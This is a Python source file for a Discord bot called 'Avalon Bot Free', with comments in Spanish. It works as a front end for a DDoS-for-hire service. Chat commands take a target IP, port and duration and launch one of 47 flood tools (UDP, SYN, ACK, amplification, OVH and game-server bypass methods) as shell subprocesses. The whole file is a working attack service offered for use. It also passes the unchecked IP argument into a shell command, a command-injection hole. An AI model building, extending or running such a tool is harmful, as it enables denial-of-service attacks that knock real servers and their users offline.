import os
import discord
from discord.ext import commands
import asyncio

# Configuración
TOKEN = "YOUR_BOT_TOKEN_HERE"
CHANNEL_ID = 1428765751472558130
BOT_PREFIX = '.'
OWNER_IDS = [1422676828161703956]

# Configuración del bot
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix=BOT_PREFIX, intents=intents)

# Variables globales
cooldowns = {}
ataque_en_curso = False
proceso_en_curso = None
COOLDOWN_DURATION = 10
MAX_ATTACK_DURATION = 120

@bot.event
async def on_ready():
    print(f'✅ Bot conectado como {bot.user.name}')
    print(f'Avalon Bot Free')
    await bot.change_presence(activity=discord.Game(name="Avalon Bot Free"))

@bot.check
async def check_channel(ctx):
    return ctx.channel.id == CHANNEL_ID

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        print(f"Comando no encontrado: {ctx.message.content}")  # Opcional: Log del comando
        return  # Ignora el error CommandNotFound
    elif isinstance(error, commands.CheckFailure):
        await ctx.send("Este comando solo puede usar en el canal https://discord.com/channels/1423090543541354518/1428765751472558130")
        return
    raise error  # Lanza otros errores para que sean manejados

async def ejecutar_ataque(comando: str, ctx, ip: str, port: int, tiempo: int, metodo: str):
    global ataque_en_curso, proceso_en_curso
    try:
        ataque_en_curso = True
        proceso_en_curso = await asyncio.create_subprocess_shell(comando)
        await proceso_en_curso.wait()
        await ctx.send(f"Ataque {metodo.upper()} {ip}:{port} finalizado")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        ataque_en_curso = False
        proceso_en_curso = None

async def enviar_mensaje_con_formato(ctx, title, description, color):
    embed = discord.Embed(title=title, description=description, color=color)
    await ctx.send(embed=embed)

# COMANDOS UDP BÁSICOS
@bot.command(name='udp')
async def udp_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
    await realizar_ataque(ctx, 'udp', ip, port, tiempo)

@bot.command(name='udpbypassv2')
async def udpbypassv2_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
    await realizar_ataque(ctx, 'udpbypassv2', ip, port, tiempo)
    
@bot.command(name='udpserver')
async def udpserver_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
    await realizar_ataque(ctx, 'udpserver', ip, port, tiempo)
    
@bot.command(name='udpdns')
async def udpdns_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
    await realizar_ataque(ctx, 'udpdns', ip, port, tiempo)
    
@bot.command(name='udpchecksum')
async def udpchecksum_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
    await realizar_ataque(ctx, 'udpchecksum', ip, port, tiempo)
    
@bot.command(name='land')
async def land_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
    await realizar_ataque(ctx, 'land', ip, port, tiempo)
    
@bot.command(name='syn')
async def syn_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
    await realizar_ataque(ctx, 'syn', ip, port, tiempo)
    
@bot.command(name='ack')
async def ack_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
    await realizar_ataque(ctx, 'ack', ip, port, tiempo)
    
@bot.command(name='gamepps')
async def gamepps_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
    await realizar_ataque(ctx, 'gamepps', ip, port, tiempo)
    
@bot.command(name='tcpbypass')
async def tcpbypass_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
    await realizar_ataque(ctx, 'tcpbypass', ip, port, tiempo)
    
@bot.command(name='tcpgame')
async def tcpgame_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
    await realizar_ataque(ctx, 'tcpgame', ip, port, tiempo)
    
@bot.command(name='udpping')
async def udpping_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
    await realizar_ataque(ctx, 'udpping', ip, port, tiempo)
    
@bot.command(name='udpsql')
async def udpsql_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
    await realizar_ataque(ctx, 'udpsql', ip, port, tiempo)
    
@bot.command(name='udpsockets')
async def udpsockets_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
    await realizar_ataque(ctx, 'udpsockets', ip, port, tiempo)
    
@bot.command(name='udpquery')
async def udpquery_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
    await realizar_ataque(ctx, 'udpquery', ip, port, tiempo)

@bot.command(name='icmp')
async def icmp_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
    await realizar_ataque(ctx, 'icmp', ip, port, tiempo)

@bot.command(name='udptls')
async def udptls_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
    await realizar_ataque(ctx, 'udptls', ip, port, tiempo)
    
@bot.command(name='stdhex')
async def stdhex_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
    await realizar_ataque(ctx, 'stdhex', ip, port, tiempo)

@bot.command(name='udpfrag')
async def udpfrag_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
    await realizar_ataque(ctx, 'udpfrag', ip, port, tiempo)

@bot.command(name='udpplain')
async def udpplain_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
    await realizar_ataque(ctx, 'udpplain', ip, port, tiempo)

@bot.command(name='udppayload')
async def udppayload_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
    await realizar_ataque(ctx, 'udppayload', ip, port, tiempo)

@bot.command(name='ovhpps')
async def ovhpps_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
    await realizar_ataque(ctx, 'ovhpps', ip, port, tiempo)
    
@bot.command(name='udpspoof')
async def udpspoof_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
    await realizar_ataque(ctx, 'udpspoof', ip, port, tiempo)

@bot.command(name='hex')
async def hex_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
    await realizar_ataque(ctx, 'hex', ip, port, tiempo)

@bot.command(name='kill')
async def kill_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
    await realizar_ataque(ctx, 'kill', ip, port, tiempo)
    
@bot.command(name='udppps')
async def udppps_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
    await realizar_ataque(ctx, 'udppps', ip, port, tiempo)

@bot.command(name='dns')
async def dns_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
    await realizar_ataque(ctx, 'dns', ip, port, tiempo)

# COMANDOS OVH BYPASS
@bot.command(name='ovhbypass')
async def ovhbypass_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
    await realizar_ataque(ctx, 'ovhbypass', ip, port, tiempo)

@bot.command(name='ovhudp')
async def ovhudp_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
    await realizar_ataque(ctx, 'ovhudp', ip, port, tiempo)

@bot.command(name='ovhtcp')
async def ovhtcp_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
    await realizar_ataque(ctx, 'ovhtcp', ip, port, tiempo)

# COMANDOS TCP
@bot.command(name='tcp')
async def tcp_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
    await realizar_ataque(ctx, 'tcp', ip, port, tiempo)

@bot.command(name='tcpmix')
async def tcpmix_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
    await realizar_ataque(ctx, 'tcpmix', ip, port, tiempo)

# MÉTODOS MIX
@bot.command(name='mix')
async def mix_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
    await realizar_ataque(ctx, 'mix', ip, port, tiempo)

# NUEVOS MÉTODOS UDP MEJORADOS
@bot.command(name='udpraw')
async def udpraw_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
    await realizar_ataque(ctx, 'udpraw', ip, port, tiempo)

@bot.command(name='udpflood')
async def udpflood_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
    await realizar_ataque(ctx, 'udpflood', ip, port, tiempo)

@bot.command(name='udpstorm')
async def udpstorm_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
    await realizar_ataque(ctx, 'udpstorm', ip, port, tiempo)

@bot.command(name='udpgame')
async def udpgame_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
    await realizar_ataque(ctx, 'udpgame', ip, port, tiempo)

@bot.command(name='udpamp')
async def udpamp_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
    await realizar_ataque(ctx, 'udpamp', ip, port, tiempo)

@bot.command(name='udpbypass')
async def udpbypass_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
    await realizar_ataque(ctx, 'udpbypass', ip, port, tiempo)

@bot.command(name='udpvse')
async def udpvse_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
    await realizar_ataque(ctx, 'udpvse', ip, port, tiempo)

@bot.command(name='udpsyn')
async def udpsyn_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
    await realizar_ataque(ctx, 'udpsyn', ip, port, tiempo)

@bot.command(name='udphttp')
async def udphttp_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
    await realizar_ataque(ctx, 'udphttp', ip, port, tiempo)

@bot.command(name='udpkill')
async def udpkill_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
    await realizar_ataque(ctx, 'udpkill', ip, port, tiempo)

@bot.command(name='icmpbypass')
async def icmpbypass_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
    await realizar_ataque(ctx, 'icmpbypass', ip, port, tiempo)

@bot.command(name='udphandshake')
async def udphandshake_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
    await realizar_ataque(ctx, 'udphandshake', ip, port, tiempo)
    
# NUEVO MÉTODO GAMEBOOM
@bot.command(name='gameboom')
async def gameboom_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
    await realizar_ataque(ctx, 'gameboom', ip, port, tiempo)

async def realizar_ataque(ctx, metodo: str, ip: str, port: str, tiempo: str):
    global ataque_en_curso
    user_id = ctx.author.id

    # Validaciones
    if ip is None or port is None or tiempo is None:
        await ctx.send(f".{metodo} ip port tiempo")
        return

    try:
        port_int = int(port)
        tiempo_int = int(tiempo)
    except ValueError:
        await ctx.send("Puerto y tiempo deben ser números")
        return

    if port_int < 1 or port_int > 65535:
        await ctx.send("Puerto no vál")
        return

    if tiempo_int <= 0:
        await ctx.send("mas de 0s")
        return

    if tiempo_int > MAX_ATTACK_DURATION:
        await ctx.send(f"Max Time: {MAX_ATTACK_DURATION}s")
        return

    # Cooldown
    if user_id in cooldowns and cooldowns[user_id] > asyncio.get_event_loop().time():
        return

    if ataque_en_curso:
        await ctx.send(f"Hay un ataque en curso")
        return

    # Comandos específicos para cada método
    comandos = {
        'udp': f'python3 udpflood.py {ip} {port_int} {tiempo_int}',
        'udpbypassv2': f'sudo ./udpbypassv2  {ip} {port_int} {tiempo_int}',
        'udpserver': f'python3 udpserver.py {ip} {port_int} {tiempo_int}',
        'udpdns': f'python3 udpdns.py {ip} {port_int} {tiempo_int}',
        'udpchecksum': f'python3 udpchecksum.py {ip} {port_int} {tiempo_int}',
        'land': f'python3 land.py {ip} {port_int} {tiempo_int}',
        'syn': f'python3 syn.py {ip} {port_int} {tiempo_int}',
        'ack': f'python3 ack.py {ip} {port_int} {tiempo_int}',
        'gamepps': f'python3 gamepps.py {ip} {port_int} {tiempo_int}',
        'tcpbypass': f'python3 tcpbypass.py {ip} {port_int} {tiempo_int}',
        'tcpgame': f'python3 tcpgame.py {ip} {port_int} {tiempo_int}',
        'udpping': f'python3 udpping.py {ip} {port_int} {tiempo_int}',
        'udpsql': f'python3 udpsql.py {ip} {port_int} {tiempo_int}',
        'udpsockets': f'python3 udpsockets.py {ip} {port_int} {tiempo_int}',
        'udphandshake': f'python3 udphandshake.py {ip} {port_int} {tiempo_int}',
        'icmpbypass': f'python3 icmpbypass.py {ip} {port_int} {tiempo_int}',
        'icmp': f'python3 icmp.py {ip} {port_int} {tiempo_int}',
        'ovhpps': f'python3 ovhpps.py {ip} {port_int} {tiempo_int}',
        'udppayload': f'python3 udppayload.py {ip} {port_int} {tiempo_int}',
        'udptls': f'python3 udptls.py {ip} {port_int} {tiempo_int}',
        'udpplain': f'python3 udpplain.py {ip} {port_int} {tiempo_int}',
        'udpfrag': f'python3 udpfrag.py {ip} {port_int} {tiempo_int}',
        'udpquery': f'python3 udpquery.py {ip} {port_int} {tiempo_int}',
        'stdhex': f'python3 stdhex.py {ip} {port_int} {tiempo_int}',
        'udpspoof': f'python3 udpspoof.py {ip} {port_int} {tiempo_int}',
        'hex': f'./hex {ip} {port_int} {tiempo_int}',
        'kill': f'python3 kill.py {ip} {port_int} {tiempo_int}',
        'udppps': f'./udppps {ip} {port_int} {tiempo_int}',
        'ovhbypass': f'./ovhbypass {ip} {port_int} {tiempo_int}',
        'ovhudp': f'sudo ./ovhudp {ip} {port_int} 40 -1 {tiempo_int}',
        'dns': f'python3 dns.py {ip} {port_int} {tiempo_int}',
        'ovhtcp': f'sudo ./ovhtcp {ip} {port_int} 40 -1 {tiempo_int}',
        'tcp': f'sudo ./tcp {ip} {port_int} {tiempo_int}',
        'tcpmix': f'python3 tcpmix.py {ip} {port_int} {tiempo_int}',
        'mix': f'python3 mix.py {ip} {port_int} {tiempo_int}',
        'udpraw': f'python3 udpraw.py {ip} {port_int} {tiempo_int}',
        'udpflood': f'./udp {ip} {port_int} {tiempo_int}',
        'udpstorm': f'python3 udpstorm.py {ip} {port_int} {tiempo_int}',
        'udpgame': f'python3 udpgame.py {ip} {port_int} {tiempo_int}',
        'udpamp': f'python3 udpamp.py {ip} {port_int} {tiempo_int}',
        'udpbypass': f'python3 udpbypass.py {ip} {port_int} {tiempo_int}',
        'udpvse': f'python3 udpvse.py {ip} {port_int} {tiempo_int}',
        'udpsyn': f'python3 udpsyn.py {ip} {port_int} {tiempo_int}',
        'udphttp': f'python3 udphttp.py {ip} {port_int} {tiempo_int}',
        'udpkill': f'python3 udpkill.py {ip} {port_int} {tiempo_int}',
        'gameboom': f'python3 gameboom.py {ip} {port_int} {tiempo_int}',
    }

    comando = comandos.get(metodo)
    if not comando:
        await ctx.send("Método no encontrado")
        return

    # Enviar mensaje de inicio
    embed = discord.Embed(
        title="ATTACK SUSSEFULLY",
        description=f"**IP:** {ip}:{port_int}\n**Méthod:** {metodo.upper()}\n**Tiempo:** {tiempo_int}s",
        color=discord.Color.green()
    )
    await ctx.send(embed=embed)

    # Establecer cooldown y ejecutar
    cooldowns[user_id] = asyncio.get_event_loop().time() + tiempo_int + COOLDOWN_DURATION
    await ejecutar_ataque(comando, ctx, ip, port_int, tiempo_int, metodo)

@bot.command(name='methods')
async def show_methods(ctx):
    embed = discord.Embed(
        title="Methods Disponibles",
        description="**Total methods: 47**",
        color=discord.Color.yellow()
    )
    
    embed.add_field(name="UDP Methods", 
                   value="• `udp` - UDP estándar\n• `hex` - Hex UDP\n• `udppps` - High PPS UDP\n• `udpraw` - Raw UDP\n• `udpflood` - Flood UDP\n• `udpstorm` - Storm UDP\n• `udpgame` - Game UDP\n• `udpamp` - Amplification\n• `udpbypass` - UDP BYPASS GAME SERVERS\n• `udpvse` - VSE Engine\n• `udpsyn` - SYN-like UDP\n• `udphttp` - HTTP over UDP\n• `udpkill` - Kill UDP\n• `ovhudp` - OVH UDP\n• `dns` - DNS Flood Attack\n• `udpspoof` - UDPSpoof Attack\n• `stdhex` - STDHEX Flood Attack\n• `udpquery` - Query UDP Flood\n• `udpfrag` - Fragmentacion UDP\n• `udpplain` - World Random Bytes\n• `udptls` - UDP Handshake TLS Flood\n• `udppayload` - UDPFLOOD Random Payload Games\n• `ovhpps` - OVH BYPASS HIGH PPS\n• `icmp` - ICMP UDP Payload Flood\n• `icmpbypass` - ICMP Payload vía UDP Packet\n• `udphandshake` - UDP Game Handshake\n• `udpsockets` - UDP Sockets Attack\n• `udpsql` - UDP SQL Payloads\n• `udpping` - UDP Unconnect Ping Game + Flood\n• `gamepps` - Game Payloads pps\n• `udpchecksum` - CheckSum UDP Invalid\n• `udpdns` - Data in subdomains\n• `udpserver` - Payload Server Games\n• `udpbypassv2` - UDP Bypass firewall",
                   inline=False)
    
    embed.add_field(name="TCP Methods", 
                   value="• `tcp` - TCP estándar\n• `ovhtcp` - OVH TCP\n• `ovhbypass` - OVH Bypass\n• `tcpmix` - MixTCP flood data+raw\n• `tcpgame` - GAME TCP Flood\n• `tcpbypass` - TCP Bypass\n• `ack` - ACK Flood\n• `syn` - SYN Flood\n• `land` - SYN packets with same source/dest IP",
                   inline=False)
    
    embed.add_field(name="Special Methods", 
                   value="• `mix` - Mix Bytes\n• `gameboom` - Game Boom attack\n• `kill` - Mixed Protocol UDP+TCP Flood",
                   inline=False)

    embed.add_field(name="L7 - HTTPS",
                    value="• `https` - PROXIMAMENTE",
                    inline=False)
    
    await ctx.send(embed=embed)

# Iniciar bot
if __name__ == "__main__":
    print("Iniciando Avalon Bot...")
    bot.run(TOKEN)
